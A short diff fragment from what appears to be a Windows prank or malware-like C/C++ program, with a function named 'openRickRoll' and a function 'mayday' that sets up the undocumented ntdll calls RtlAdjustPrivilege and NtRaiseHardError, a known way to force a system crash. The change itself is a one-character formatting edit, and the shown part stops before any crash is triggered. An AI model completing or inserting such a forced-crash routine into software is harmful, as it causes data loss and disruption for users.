@@ -134,7 +134,7 @@ void openRickRoll() {
 	void mayday() {
 		// function pointers to hold addresses to necessary functions
 		typedef NTSTATUS(WINAPI *fn_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
-		typedef NTSTATUS(WINAPI* fn_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
+		typedef NTSTATUS(WINAPI *fn_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 
 		BOOLEAN bEnabled; ULONG uResp;
 		LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
